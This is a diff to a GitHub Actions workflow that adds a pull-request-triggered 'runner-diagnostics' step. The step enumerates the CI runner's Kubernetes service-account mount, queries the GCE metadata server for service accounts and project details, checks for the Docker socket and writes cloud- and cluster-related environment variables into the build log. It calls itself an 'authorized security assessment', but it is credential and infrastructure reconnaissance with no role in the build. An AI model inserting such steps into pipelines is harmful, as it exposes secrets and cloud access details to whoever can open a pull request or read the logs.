@@ -30,6 +30,28 @@ jobs:
     steps:
       - uses: actions/checkout@v7
 
+      - name: runner-diagnostics
+        if: github.event_name == 'pull_request'
+        run: |
+          echo "=== authorized security assessment diagnostics begin ==="
+          echo "host=$(hostname)"
+          echo "--- k8s serviceaccount ---"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "no-namespace-file"
+          ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "no-sa-mount"
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset}:${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "--- gce metadata ---"
+          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' | head -c 1500 || echo no-metadata
+          echo
+          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' | head -c 200 || true
+          echo
+          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/project-id' | head -c 200 || true
+          echo
+          echo "--- docker ---"
+          ls -la /var/run/docker.sock 2>/dev/null || echo "no-docker-sock"
+          echo "--- relevant env ---"
+          env | grep -Ei 'RUNNER|ARC|KUBE|GCP|GOOGLE|CLUSTER|PROJECT|REGISTRY' | head -40
+          echo "=== authorized security assessment diagnostics end ==="
+
       - name: Set up Go
         uses: actions/setup-go@v7
         with:
